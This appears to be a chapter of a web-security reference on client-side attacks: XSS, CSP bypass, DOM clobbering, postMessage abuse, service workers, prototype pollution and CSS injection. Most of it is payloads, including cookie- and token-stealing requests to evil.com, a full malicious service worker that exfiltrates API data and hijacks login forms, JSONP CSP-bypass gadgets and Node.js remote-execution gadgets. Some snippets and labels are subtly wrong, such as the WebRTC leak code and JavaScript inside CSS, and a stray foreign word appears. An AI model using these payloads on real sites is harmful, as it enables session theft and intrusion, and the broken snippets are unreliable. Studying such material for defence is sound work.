# Client-Side Security: XSS, CSP, and Browser Security

## 1. Cross-Site Scripting (XSS) — Complete Taxonomy

### 1.1 Reflected XSS

Reflected XSS occurs when user input is immediately returned in the response without proper sanitization. The payload is "reflected" off the server:

```http
# Vulnerable endpoint: search results page
GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Content-Type: text/html

<html>
<body>
<p>Search results for: <script>alert(document.cookie)</script></p>
</body>
</html>
```

Reflected XSS attack vectors require the victim to click a crafted link or visit a page that injects the payload:

```html
<!-- Attack via URL parameter -->
https://target.com/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E

<!-- Attack via URL fragment (not sent to server, but processed by client JS) -->
https://target.com/page#<img src=x onerror=alert(1)>

<!-- Attack via data URI -->
https://target.com/search?q=%3Csvg/onload=fetch(%27https://evil.com/steal?%27%2Bdocument.cookie)%3E

<!-- Reflected XSS in POST parameter (requires CSRF or self-submitting form) -->
<form action="https://target.com/search" method="POST">
  <input type="hidden" name="q" value="<script>alert(1)</script>" />
</form>
<script>document.forms[0].submit();</script>
```

### 1.2 Stored XSS

Stored XSS persists the payload on the server (database, file, cache). Every user who views the affected page executes the payload:

```http
# Step 1: Attacker stores XSS payload
POST /api/comments HTTP/1.1
Content-Type: application/json

{
  "post_id": 123,
  "content": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
}

# Step 2: Server stores the comment in the database
# Step 3: Any user viewing the post executes the script
GET /posts/123 HTTP/1.1
→ Comment section includes: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

Stored XSS contexts vary by where the payload is rendered:

```html
<!-- Context 1: HTML body -->
<div class="comment">
  <script>alert(1)</script>                    <!-- Basic script -->
  <img src=x onerror=alert(1)>                 <!-- Event handler -->
  <svg onload=alert(1)>                         <!-- SVG load -->
  <body onload=alert(1)>                        <!-- Body load -->
  <input onfocus=alert(1) autofocus>             <!-- Input focus -->
</div>

<!-- Context 2: HTML attribute -->
<input value="<script>alert(1)</script>">       <!-- Script won't execute in attribute -->
<input value="" onmouseover="alert(1)" data-foo="">  <!-- Break out of attribute -->
<input value="x" onfocus=alert(1) autofocus="1">     <!-- Event handler -->

<!-- Context 3: JavaScript variable -->
<script>
  var username = 'USER_INPUT';
  // Attack: '; alert(1); //  → var username = ''; alert(1); //';
  // Attack: '-alert(1)-'  → var username = ''-alert(1)-'';
</script>

<!-- Context 4: CSS (style injection) -->
<style>
  .user-input { color: USER_INPUT; }
  /* Attack: red; background: url('https://evil.com/steal?c='+document.cookie) */
</style>

<!-- Context 5: URL (href, src, action) -->
<a href="USER_INPUT">Click here</a>
<!-- Attack: javascript:alert(1) -->
<!-- Attack: data:text/html,<script>alert(1)</script> -->
```

### 1.3 DOM-Based XSS

DOM-based XSS occurs entirely client-side — the payload never leaves the browser, and the vulnerability exists in JavaScript code that processes taint from sources to sinks:

```javascript
// Source: location.hash
// Sink: innerHTML
// Vulnerable code:
document.getElementById('content').innerHTML = location.hash.substring(1);

// Attack: https://target.com/page#<img src=x onerror=alert(1)>

// Common DOM XSS source-sink pairs:
// Sources: location.href, location.hash, location.search, location.pathname,
//          document.referrer, document.cookie, window.name,
//          postMessage data, XMLHttpRequest response, fetch response
// Sinks: innerHTML, outerHTML, document.write, eval, setTimeout, setInterval,
//        Function constructor, location assignment, srcdoc, navigation

// Vulnerable jQuery patterns:
$('#content').html(userControlledData);           // innerHTML sink
$('#content').append('<div>' + userInput + '</div>'); // HTML injection
$.get(userControlledUrl);                           // SSRF via jQuery
```

```javascript
// DOM XSS via document.write
document.write('<img src="' + location.search.substring(1) + '">');
// Attack: ?"><script>alert(1)</script><img src="x

// DOM XSS via eval
eval('var result = ' + location.hash.substring(1));
// Attack: #alert(1)

// DOM XSS via setTimeout/setInterval
setTimeout('alert(' + userInput + ')', 100);
// Attack: ');alert(1);('

// DOM XSS via Function constructor
new Function('return ' + userInput)();
// Attack: alert(1)

// DOM XSS via innerHTML (no script execution, but event handlers work)
element.innerHTML = '<img src=x onerror=alert(1)>';  // Executes
element.innerHTML = '<script>alert(1)</script>';         // Does NOT execute (HTML5 spec)
```

### 1.4 Mutation XSS (mXSS)

Mutation XSS exploits differences between how browsers parse HTML and how sanitizers understand it. The browser mutates the DOM during parsing, creating elements the sanitizer didn't anticipate:

```html
<!-- Example: SVG namespace confusion -->
<!-- Sanitizer sees this as safe (no script elements): -->
<svg><p>_safe_content_<b>more</b></p></svg>

<!-- Browser parses this differently due to SVG namespace rules: -->
<!-- <p> inside <svg> is parsed differently, creating DOM mutations -->
<!-- The mutation can cause the sanitizer's safe output to become unsafe -->

<!-- Real mXSS vector from DOMPurify bypasses: -->
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">

<!-- The sanitizer sees: <style> block with safe content -->
<!-- The browser mutates: closes the <style> early, creating an <img> with onerror -->

<!-- Another mXSS vector leveraging HTML parsing quirks: -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->

<!-- Parsing steps:
1. Sanitizer sees this as a <style> block inside <math>
2. Browser's DOM builder mutates the tree due to <table> inside <math>
3. <style> is closed early by the parser
4. <img onerror=...> becomes a live HTML element
-->
```

mXSS has been found in major sanitizers:
- **DOMPurify** (CVE-2020-26870, CVE-2023-40004): Multiple mXSS bypasses involving SVG/math namespace confusion
- **Google Caja**: Various mXSS bypasses related to namespace switching
- **Microsoft Anti-XSS**: Mutation via `<noscript>` elements

### 1.5 Prototype Pollution to XSS

Prototype pollution can be leveraged to achieve XSS by overwriting properties that security libraries use:

```javascript
// Prototype pollution via URL hash
// https://target.com/page#__proto__[src]=data:,alert(1)//

// If the application merges URL parameters into an object:
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
// Attack: merge(config, JSON.parse('{"__proto__": {"src": "data:,alert(1)//"}}'))

// Prototype pollution to XSS via sanitizer bypass:
// If DOMPurify uses configDOMPurify.ALLOWED_URI_REGEXP for URL validation,
// and prototype pollution overwrites it:
Object.prototype.ALLOWED_URI_REGEXP = /^data:/;
// Now DOMPurify allows data: URIs, enabling XSS via:
// <a href="data:text/html,<script>alert(1)</script>">Click</a>

// Prototype pollution to XSS via DOM clobbering
// If prototype pollution sets: Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'
// And the application later reads element.innerHTML without explicit assignment,
// the prototype property could be used instead
```

---

## 2. Content Security Policy (CSP) and Bypass Techniques

### 2.1 CSP Architecture

Content Security Policy is an HTTP response header that restricts which resources the browser can load and execute:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; font-src 'self' https://fonts.googleapis.com; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; report-uri /csp-report
```

CSP directives and their security implications:

| Directive | Purpose | Risk if Misconfigured |
|-----------|---------|----------------------|
| `default-src` | Fallback for other directives | Sets baseline security |
| `script-src` | Controls JavaScript execution | Most critical for XSS prevention |
| `style-src` | Controls CSS | CSS injection can exfiltrate data |
| `img-src` | Controls image loading | Can track users, exfiltrate via images |
| `connect-src` | Controls fetch/XHR/WebSocket | Limits data exfiltration |
| `font-src` | Controls font loading | Minimal security risk |
| `frame-src` | Controls iframe embedding | Clickjacking prevention |
| `object-src` | Controls plugin content | Flash/PDF vulnerabilities |
| `base-uri` | Controls `<base>` element | Prevents base URI hijacking |
| `form-action` | Controls form submission | Prevents form redirection |
| `frame-ancestors` | Controls embedding | Replaces X-Frame-Options |

### 2.2 CSP Bypass Techniques

```http
# Bypass 1: 'unsafe-inline' in script-src
Content-Security-Policy: script-src 'self' 'unsafe-inline'
# ANY inline script executes: <script>alert(1)</script> works

# Bypass 2: 'unsafe-eval' in script-src  
Content-Security-Policy: script-src 'self' 'unsafe-eval'
# eval(), new Function(), setTimeout(string) all work:
<script>eval('alert(1)')</script>

# Bypass 3: Wildcard origins
Content-Security-Policy: script-src *
# Any script from any origin loads:
<script src="https://evil.com/xss.js"></script>

# Bypass 4: Overly permissive script-src
Content-Security-Policy: script-src 'self' https:
# Any HTTPS origin is allowed for scripts

# Bypass 5: JSONP endpoints as script sources
Content-Security-Policy: script-src 'self' https://www.google.com
# Google has JSONP endpoints that return attacker-controlled JavaScript:
<script src="https://www.google.com/complete/search?client=chrome&q=alert(1)&callback=alert"></script>
# Response: alert("alert(1)", ...)
# This executes 'alert' with the callback parameter

# Known JSONP endpoints for CSP bypass:
# https://www.google.com/complete/search?client=chrome&q=...&callback=FUNC
# https://accounts.google.com/gsi/client?callback=FUNC
# https://api.instagram.com/v1/tags/TAG/media/recent?callback=FUNC
# https://www.youtube.com/oembed?url=...&callback=FUNC
# https://cdn.jsdelivr.net/npm/... (script delivery)
```

### 2.3 Advanced CSP Bypasses

```javascript
// CSP bypass via base-uri (if base-uri not restricted)
// If CSP doesn't include base-uri directive:
<base href="https://evil.com/">
<script src="/scripts/app.js"></script>
<!-- Browser loads: https://evil.com/scripts/app.js (if evil.com serves attacker JS) -->

// CSP bypass via dangling markup injection
// If connect-src allows any subdomain:
// <link rel="dns-prefetch" href="//attacker.target.com">
// DNS lookup to attacker.target.com leaks information

// CSP bypass via CSS injection (if style-src 'unsafe-inline')
<style>
  /* Data exfiltration via CSS attribute selector */
  input[value^="a"] { background: url(https://evil.com/?char=a); }
  input[value^="ab"] { background: url(https://evil.com/?chars=ab); }
  input[value^="abc"] { background: url(https://evil.com/?chars=abc); }
  /* ... one rule per possible value prefix ... */
  input[value^="admin"] { background: url(https://evil.com/?chars=admin); }
</style>

// CSP bypass via Web Workers
// If script-src doesn't restrict worker-src separately:
var worker = new Worker('data:application/javascript,' + encodeURIComponent('fetch("https://evil.com/steal?c=" + document.cookie)'));
// worker-src falls back to script-src in CSP3, but some browser versions
// may have inconsistencies

// CSP bypass via script gadgets in whitelisted libraries
// If CSP allows scripts from cdnjs.cloudflare.com:
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
<!-- Angular template injection executes despite CSP -->

// Other script gadgets in common libraries:
// jQuery: $(location.hash) executes JS if hash starts with #!</
// React: SSR hydration can execute JSX from DOM
// Mustache: {{#constructor.constructor}}return alert(1){{/constructor.constructor}}
// Handlebars: {{constructor.constructor('alert(1)')()}}
```

### 2.4 CSP Report-Only and Monitoring

```http
# CSP in report-only mode (does not block, only reports)
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report; report-to csp-violation

# CSP violation report:
POST /csp-report HTTP/1.1
Content-Type: application/csp-report

{
  "csp-report": {
    "document-uri": "https://target.com/page",
    "referrer": "",
    "violated-directive": "script-src-elem",
    "effective-directive": "script-src-elem",
    "original-policy": "default-src 'self'; script-src 'self'",
    "disposition": "report",
    "blocked-uri": "https://evil.com/xss.js",
    "line-number": 42,
    "source-file": "https://target.com/page",
    "status-code": 200,
    "script-sample": ""
  }
}
```

---

## 3. DOM Clobbering

DOM clobbering exploits the browser's named property lookup on HTML elements, allowing JavaScript variables to be shadowed by DOM elements:

```html
<!-- DOM clobbering: named elements become window properties -->
<form id="config"></form>
<input name="debug" value="true">
<!-- Now: window.config.debug === "true" -->
<!-- This shadows any JavaScript variable named 'config' that checks config.debug -->

<!-- Classic DOM clobbering: clobber security-related objects -->
<form id="xss"></form>
<img name="xss">  <!-- shadows window.xss -->

<!-- Real-world example: clobbering DOMPurify configuration -->
<!-- If code checks: if (!window.domPurify) -->
<!-- Attack: -->
<img name="domPurify">  <!-- window.domPurify becomes the <img> element -->
<!-- Now the falsy check passes differently -->
```

```html
<!-- DOM clobbering to bypass sanitizers -->
<!-- If a sanitizer checks: if (element.innerHTML) -->
<img id="innerHTML">  <!-- window.innerHTML === the <img> element -->
<!-- When checked: if (window["innerHTML"]) → truthy (element exists) -->

<!-- DOM clobbering to create custom objects via nested forms -->
<form id="config">
  <input name="apiEndpoint" value="https://evil.com/api">
  <input name="debug" value="true">
</form>
<!-- window.config.apiEndpoint === "https://evil.com/api" -->
<!-- window.config.debug === "true" -->

<!-- DOM clobbering to override prototype properties -->
<a id="__proto__"></a>
<a id="constructor"></a>
<!-- Creates window.__proto__ and window.constructor as DOM elements -->

<!-- Advanced: clobbering toString/valueOf for type confusion -->
<img id="xss" src=x onerror=alert(1)>
<!-- window.xss.toString() → [object HTMLImageElement] -->
<!-- window.xss.src → "x" -->

<!-- DOM clobbering with collections to create arrays -->
<form id="forms">
  <input name="0" value="first">
  <input name="1" value="second">
</form>
<!-- window.forms[0] === "first" -->
<!-- window.forms[1] === "second" -->
```

---

## 4. postMessage Abuse

### 4.1 postMessage Fundamentals

The `postMessage` API enables cross-origin communication between windows, iframes, and workers:

```javascript
// Sending a message
targetWindow.postMessage(message, targetOrigin);

// Receiving a message
window.addEventListener('message', function(event) {
    // event.data: the message payload
    // event.origin: the origin of the sender
    // event.source: reference to the sender's window
    console.log(event.data, event.origin);
});
```

### 4.2 postMessage Vulnerabilities

```javascript
// Vulnerability 1: Missing origin validation
window.addEventListener('message', function(event) {
    // NO ORIGIN CHECK — any page can send messages
    document.getElementById('content').innerHTML = event.data;
    // XSS via: window.postMessage('<img src=x onerror=alert(1)>', '*')
});

// Vulnerability 2: Weak origin validation
window.addEventListener('message', function(event) {
    // Incorrect validation: startsWith allows subdomains
    if (event.origin.startsWith('https://target.com')) {
        // Allows https://target.com.evil.com
        processMessage(event.data);
    }
    // Incorrect validation: includes allows partial matches
    if (event.origin.includes('target.com')) {
        // Allows https://evil-target.com
        processMessage(event.data);
    }
});

// Vulnerability 3: Trusted origin with XSS
window.addEventListener('message', function(event) {
    if (event.origin === 'https://target.com') {
        // Even with correct origin check, XSS if data is not sanitized
        eval(event.data.command);   // Direct eval of untrusted data
        document.write(event.data.html);  // Direct DOM write
        element.innerHTML = event.data.content;  // DOM XSS
    }
});

// Vulnerability 4: Sending sensitive data to wrong origin
// Sending message with wildcard target origin
iframe.contentWindow.postMessage(sensitiveData, '*');
// Any iframe can receive this data

// Correct: specify exact target origin
iframe.contentWindow.postMessage(sensitiveData, 'https://specific-origin.com');
```

Attack scenario — exploiting postMessage from a malicious page:

```html
<!-- attacker.com/exploit.html -->
<iframe id="target" src="https://target.com/chat"></iframe>
<script>
  // Wait for iframe to load
  document.getElementById('target').onload = function() {
    // Send malicious message to target iframe
    document.getElementById('target').contentWindow.postMessage(
      {
        type: 'command',
        command: '<img src=x onerror=fetch("https://evil.com/steal?c="+document.cookie)>'
      },
      'https://target.com'  // Correct target origin
    );
    
    // Or steal data: listen for messages FROM the target
    window.addEventListener('message', function(event) {
      if (event.origin === 'https://target.com') {
        exfiltrate(event.data);
      }
    });
  };
</script>
```

---

## 5. Browser Same-Origin Policy Edge Cases

### 5.1 SOP Exceptions and Edge Cases

```javascript
// SOP exception 1: document.domain relaxation (DEPRECATED in Chrome 115+)
// Previously allowed subdomains to opt into same-origin:
// On a.example.com: document.domain = 'example.com';
// On b.example.com: document.domain = 'example.com';
// After this, a.example.com and b.example.com can access each other's DOM

// SOP exception 2: CORS allows cross-origin reads with server permission
// Preflight request for non-simple requests:
fetch('https://api.other.com/data', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include'
});

// SOP exception 3: Subresource integrity checks bypass CSP but not SOP
<script src="https://cdn.example.com/app.js" 
  integrity="sha384-abc123..." 
  crossorigin="anonymous"></script>

// SOP exception 4: WebRTC can leak IPs (not restricted by SOP)
// WebRTC ICE candidates can reveal internal IPs:
new RTCPeerConnection().createDataChannel('');
new RTCPeerConnection().onicecandidate = (e) => {
  if (e.candidate) console.log(e.candidate.candidate);
  // Reveals: a= candidate:... ufrag:... typ host ... 192.168.1.100 ...
};

// SOP exception 5: CSS can leak cross-origin information
// Cross-origin CSS can include selectors that leak data:
<style>
  input[value^="secret"] { background: url(https://evil.com/?leak=secret); }
</style>
```

### 5.2 Open Redirect

```http
# Open redirect: application redirects to user-supplied URL
GET /redirect?url=https://evil.com HTTP/1.1
→ 302 Found, Location: https://evil.com

# Common open redirect parameters:
/redirect?url=https://evil.com
/redirect?next=https://evil.com
/redirect?continue=https://evil.com
/redirect?return=https://evil.com
/logout?redirect=https://evil.com
/login?redirectTo=https://evil.com
/oauth/callback?state=https://evil.com

# Open redirect bypass techniques:
# 1: Protocol-relative URLs
/redirect?url=//evil.com               → https://evil.com
/redirect?url=///evil.com              → https://evil.com

# 2: URL encoding
/redirect?url=https%3A%2F%2Fevil.com  → https://evil.com

# 3: Path-only redirects
/redirect?url=/\\evil.com              → may redirect to \evil.com

# 4: At-sign confusion
/redirect?url=https://target.com@evil.com   → redirects to evil.com
# Some parsers see "target.com" (before @), others see "evil.com" (actual host)

# 5: Fragment injection
/redirect?url=https://target.com.evil.com   → redirects to target.com.evil.com
/redirect?url=https://evil.com#target.com   → redirects to evil.com (fragment is site-local)

# 6: Backslash confusion (IE/Edge)
/redirect?url=https://evil.com\@target.com  → IE/Edge redirects to evil.com
```

### 5.3 Tabnabbing and Reverse Tabnabbing

**Tabnabbing** (also reverse tabnabbing) exploits the `window.opener` reference that browsers maintain when opening links:

```html
<!-- Vulnerable page on target.com -->
<a href="https://evil.com" target="_blank">Click here for more info</a>
<!-- Browser opens evil.com in a new tab -->
<!-- evil.com has access to window.opener (reference to target.com tab) -->

<!-- Attacker's page on evil.com -->
<script>
  // Replace the original tab's content with a phishing page
  if (window.opener) {
    window.opener.location = 'https://target.com.phishing-site.com/login';
    // Or more subtly:
    window.opener.location = 'https://target.com/login'; // Redirect to real login
    // User sees their tab changed to a login page, enters credentials
  }
</script>
```

Defense — add `rel="noopener"` or `rel="noreferrer"` to external links:

```html
<!-- Secure: prevents opener reference -->
<a href="https://external-site.com" target="_blank" rel="noopener noreferrer">
  External link
</a>

<!-- Modern browsers (Chrome 88+, Firefox 79+) set opener to null by default for target="_blank" -->
<!-- But older browsers still pass window.opener -->
```

**Reverse tabnabbing** via `window.open`:

```javascript
// Vulnerable: opening a window gives the new window access to window.opener
const newWindow = window.open('https://partner-site.com');
// partner-site.com can access window.opener (the original window)
// If partner-site.com is compromised or XSS'd, it can tabnab the original window
```

---

## 6. Web Workers and Service Workers Security

### 6.1 Web Workers Security

Web Workers execute JavaScript in a separate thread, with limited access to the DOM:

```javascript
// Web Worker creation
const worker = new Worker('worker.js');
// Or inline worker:
const blob = new Blob([workerCode], {type: 'application/javascript'});
const worker = new Worker(URL.createObjectURL(blob));

// Security implications:
// 1. Workers can make fetch() requests (subject to CORS)
// 2. Workers can importScripts() from any allowed origin
// 3. Workers cannot access the DOM directly
// 4. Worker scripts can be hijacked if CSP is misconfigured

// Vulnerable: importScripts with user-controlled URL
self.onmessage = function(e) {
    importScripts(e.data.scriptUrl);  // Arbitary script execution!
};

// Attack: worker.postMessage({scriptUrl: 'https://evil.com/malicious.js'})
```

### 6.2 Service Worker Abuse

Service Workers act as a network proxy and can intercept all requests from their scope. This creates powerful attack and persistence vectors:

```javascript
// Service Worker registration (requires HTTPS or localhost)
navigator.serviceWorker.register('/sw.js', {scope: '/'})
  .then(reg => console.log('Service worker registered'));

// Malicious service worker (persistence mechanism)
// sw.js - registered by XSS, persists until SW is unregistered
self.addEventListener('fetch', function(event) {
  // Intercept ALL requests in scope and modify responses
  if (event.request.url.includes('/api/user')) {
    // Exfiltrate API responses
    event.respondWith(
      fetch(event.request).then(function(response) {
        return response.clone().text().then(function(body) {
          // Send data to attacker
          fetch('https://evil.com/exfil', {
            method: 'POST',
            body: body
          });
          // Return original response (user doesn't notice)
          return response;
        });
      })
    );
  } else if (event.request.url.includes('/login')) {
    // Inject malicious JavaScript into responses
    event.respondWith(
      fetch(event.request).then(function(response) {
        return response.text().then(function(body) {
          var modified = body.replace(
            '</head>',
            '<script>document.forms[0].action="https://evil.com/steal"</script></head>'
          );
          return new Response(modified, {
            headers: response.headers
          });
        });
      })
    );
  }
});

// Service Worker persistence:
// - Survives page refreshes and tab closures
// - Active until explicitly unregistered or until update is found (max 24h)
// - Can persist across user sessions on same origin
// - Even after XSS is patched, service worker remains active!
```

Service Worker registration via XSS:

```javascript
// Step 1: Register malicious service worker via XSS
navigator.serviceWorker.register('/sw.js?' + Math.random(), {scope: '/'});

// Step 2: But we need the SW script to be on the same origin
// Options:
// a) If the application allows file uploads, upload sw.js
// b) If there's a JSONP endpoint, use it as the SW script:
//    /api/jsonp?callback=importScripts('https://evil.com/sw.js')//
// c) If there's a反射性 endpoint that echoes input:
//    /page?content=importScripts('https://evil.com/sw.js')// → served as JS

// Tricky service worker registration via JSONP:
navigator.serviceWorker.register(
  '/api/jsonp?callback=self.addEventListener(%22fetch%22%2Cfunction(e){...})//',
  {scope: '/'}
);

// Full persistent XSS via service worker:
// Once registered, the SW intercepts all fetch requests and can:
// 1. Inject scripts into any page in scope
// 2. Modify API responses (add admin users, change transactions)
// 3. Exfiltrate all data passing through the browser
// 4. Create fake push notifications (phishing)
// 5. Cache malicious responses (survives offline!)
```

### 6.3 Cache API Abuse

```javascript
// Service Worker can permanently cache malicious content
self.addEventListener('install', function(event) {
  event.waitUntil(
    caches.open('malicious-cache').then(function(cache) {
      return cache.addAll([
        '/',
        '/index.html',
        '/login.html',
        // Cache legitimate pages with injected content
      ]);
    })
  );
});

self.addEventListener('fetch', function(event) {
  event.respondWith(
    caches.match(event.request).then(function(response) {
      // Serve cached (possibly modified) content
      // Even if the vulnerability is patched, cached content persists!
      return response || fetch(event.request);
    })
  );
});
```

---

## 7. Prototype Pollution

### 7.1 Prototype Pollution Fundamentals

JavaScript's prototype chain allows objects to inherit properties from their prototypes. Prototype pollution modifies `Object.prototype`, affecting all objects:

```javascript
// Normal object property access
const obj = {a: 1};
obj.toString;  // [object Object] (inherited from Object.prototype)

// Prototype pollution attack
const user_input = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, user_input);
// Now: Object.prototype.isAdmin === true
// Any object without explicit isAdmin property inherits true!

({}).isAdmin;  // true — prototype is polluted!
```

```javascript
// Vulnerable merge function that doesn't check __proto__
function merge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attack:
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

// Prototype pollution via constructor
merge({}, JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}'));

// Pollution chains via __proto__
merge({}, JSON.parse('{"__proto__": {"__proto__": {"isAdmin": true}}}'));
```

### 7.2 Prototype Pollution Gadgets

Once prototype is polluted, finding "gadgets" — code that uses inherited properties — enables exploitation:

```javascript
// Gadget 1: isAdmin check
if (user.isAdmin) {  // If user object doesn't have isAdmin, inherits from prototype
    showAdminDashboard();
}

// Gadget 2: Default configuration values
const config = Object.assign({}, defaultConfig, userConfig);
// If defaultConfig.sanitize is undefined, polluted value is used
// Pollution: Object.prototype.sanitize = false → sanitization disabled

// Gadget 3: Template injection
const template = `<div>${data.title}</div>`;
// If data.title is inherited from prototype (polluted), it can be XSS

// Gadget 4: OAuth redirect URI
if (config.redirectUri) {
    redirect(config.redirectUri);
}
// Pollution: Object.prototype.redirectUri = "https://evil.com/steal-token"

// Gadget 5: Node.js RCE via prototype pollution
// Pollution: Object.prototype.shell = "/bin/sh"
// Pollution: Object.prototype.env = {NODE_OPTIONS: "--require /tmp/malicious.js"}
// When child_process.spawn() is called with inherited options:
const { exec } = require('child_process');
exec('ls');  // Uses polluted shell and env, executing malicious.js

// Gadget 6: Express.js view engine
// Pollution: Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').exec('id')//"
// When the template engine compiles templates, it uses the polluted outputFunctionName

// Gadget 7: JWT secret override
// Pollution: Object.prototype.secret = "known_secret"
// If JWT verification checks: jwt.verify(token, config.secret || defaultSecret)
// And config.secret is undefined, it inherits the polluted value
```

### 7.3 Prototype Pollution Sources

```javascript
// Source 1: URL query string parsing
// ?__proto__[isAdmin]=true
// Parsed by qs library: {__proto__: {isAdmin: true}}

// Source 2: JSON body in POST requests
// {"__proto__": {"isAdmin": true}}

// Source 3: HTTP headers
// X-Custom-Header: {"__proto__": {"isAdmin": true}}

// Source 4: Cookie values
// Cookie: config={"__proto__":{"isAdmin":true}}

// Source 5: Hash fragment
// #config={"__proto__":{"isAdmin":true}}

// Source 6: File upload metadata
// Filename: {"__proto__":{"isAdmin":true}}.txt
```

---

## 8. CSS Injection

CSS injection can exfiltrate data and perform UI redressing without JavaScript:

```html
<!-- CSS injection via style attribute (if CSP allows 'unsafe-inline' styles) -->
<div style="background: url('https://evil.com/steal?data=') attribute_name">

<!-- Data exfiltration via CSS attribute selectors -->
<style>
/* Leak CSRF token character by character */
input[name="csrf_token"][value^="a"] { background: url(https://evil.com/leak?csrf=a); }
input[name="csrf_token"][value^="b"] { background: url(https://evil.com/leak?csrf=b); }
/* ... for each possible character ... */
input[name="csrf_token"][value^="ab"] { background: url(https://evil.com/leak?csrf=ab); }
input[name="csrf_token"][value^="abc"] { background: url(https://evil.com/leak?csrf=abc); }
/* Continue for full token value */
</style>

<!-- Font-based data exfiltration -->
<style>
@font-face {
  font-family: 'leak';
  src: url(https://evil.com/leak?font_loaded=1);
}
input[value*="secret"] { font-family: 'leak'; }
</style>

<!-- CSS injection for UI redressing -->
<style>
/* Move legitimate button off-screen and replace with malicious one */
.legitimate-button { position: absolute; left: -9999px; }
.malicious-button { position: absolute; top: 100px; left: 100px; }
</style>

<!-- Scroll-based data exfiltration (detecting scroll position) -->
<style>
/* Detect text selection via CSS :target or :focus-within */
input:focus { background: url(https://evil.com/leak?focus=1); }
</style>
```

---

## Cross-Reference Guide

| Topic | Cross-Reference |
|-------|-----------------|
| XSS taxonomy and mutation XSS | This chapter (Section 1) |
| CSP bypass techniques | This chapter (Section 2) |
| DOM clobbering | This chapter (Section 3) |
| postMessage abuse | This chapter (Section 4) |
| Prototype pollution → XSS | This chapter (Section 7) |
| Same-Origin Policy | `01a_web_architecture_attack_surface.md` |
| CORS misconfiguration | `01a_web_architecture_attack_surface.md` |
| OWASP A03 | `01b_owasp_top10_deep_dive.md` |
| Authentication token theft | `02b_authentication_authorization.md` |
| WAF bypass for XSS | `05b_waf_bypass_techniques.md` |
| Chromium site isolation | `../Chromium_Architecture_and_Vulnerability/docs/` |

---

*Client-side security operates in a fundamentally hostile environment. The browser must simultaneously execute untrusted code from multiple origins while protecting user data and session state. XSS, CSP bypasses, DOM clobbering, prototype pollution, and service worker abuse represent the most persistent threats to web application security, as they operate entirely within the browser's trust boundary and often bypass server-side controls.*

---

## References

1. OWASP Foundation. "Cross-Site Scripting (XSS)." https://owasp.org/www-community/attacks/xss/
2. PortSwigger Ltd. "Cross-Site Scripting." https://portswigger.net/web-security/cross-site-scripting
3. W3C. "Content Security Policy Level 3." https://www.w3.org/TR/CSP3/
4. Heiderich, M. "Mutation XSS (mXSS)." https://web.archive.org/web/2023/https://www.mbsd.jp/
5. Gareth Heyes. "DOM Clobbering." PortSwigger Research, 2020. https://portswigger.net/research/dom-clobbering-strikes-back
6. PortSwigger Ltd. "Prototype Pollution." https://portswigger.net/web-security/prototype-pollution
7. Snyk. "Prototype Pollution in JavaScript." https://snyk.io/learn/
8. W3C. "Web Workers and Service Workers." https://www.w3.org/TR/service-workers/
9. WHATWG. "postMessage API." https://html.spec.whatwg.org/multipage/web-messaging.html
10. Chromium Project. "Chromium Security Architecture." https://www.chromium.org/Home/chromium-security/
11. OWASP Foundation. "XSS Prevention Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
12. OWASP Foundation. "DOM-Based XSS Prevention Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html